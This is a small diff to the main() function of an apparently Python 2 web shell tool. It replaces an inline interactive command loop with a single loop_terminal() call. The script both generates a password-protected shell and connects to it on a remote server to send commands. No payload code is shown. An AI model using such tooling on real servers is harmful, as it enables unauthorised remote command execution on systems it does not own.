@@ -30,21 +30,9 @@ def main(params):
 		password = params.p
 	if params.g and params.p:
 		shell.set_generator()
-	if params.u and params.p:			
-		Server = Server(params.u,params.p)
-		con = Server.conect()
-		if con['response'] == '200':
-			print "#> Conecction Established, Enjoy!\n"
-			terminal = Terminal(url,paramss.p)
-			server_info = Server.server_info()
-			while True:
-				send = raw_input(server_info['server_name']+"@"+server_info['user']+"["+server_info['pwd']+"]"+server_info['user_bash']+">")
-				termina = terminal.terminal(send)
-				print termina['command']
-		elif con['response'] == '302':
-			print "robot@shuffle[~]$> Response: "+con['error']
-		else:
-			print "robot@shuffle[~]$> Connection fail."
+	if params.u and params.p:
+		conection = Terminal(params.u,params.p)			
+		conection.loop_terminal()
 if __name__ == '__main__':
 	terminal = Terminal(params.u,params.p)
 	shell = Generator(params.g,params.p)
